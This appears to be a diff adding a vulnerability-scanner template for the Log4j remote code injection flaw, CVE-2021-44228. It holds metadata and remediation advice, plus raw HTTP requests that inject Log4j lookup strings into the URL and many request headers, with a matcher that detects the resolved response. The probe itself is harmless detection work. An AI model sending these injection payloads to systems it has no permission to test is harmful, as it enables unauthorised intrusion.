@@ -1,0 +1,57 @@
+id: CVE-2021-44228
+
+info:
+  name: Apache Log4j2 Remote Code Injection
+  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
+  severity: critical
+  description: |
+    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  tags: cve,cve2021,rce,oast,log4j,injection,cisa
+
+requests:
+  - raw:
+      - |
+        GET /?x=${java:${env:NONEXISTENV:-abrahackbaby}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Accept-Encoding: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Accept-Language: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Access-Control-Request-Headers: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Access-Control-Request-Method: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Authentication: Basic ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Authentication: Bearer ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Cookie: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Location: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Origin: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Referer: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        Upgrade-Insecure-Requests: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        User-Agent: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        X-Api-Version: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        X-CSRF-Token: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        X-Druid-Comment: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        X-Forwarded-For: ${java:${env:NONEXISTENV:-abrahackbaby}}
+        X-Origin: ${java:${env:NONEXISTENV:-abrahackbaby}}
+
+    stop-at-first-match: true
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java:abrahackbaby"
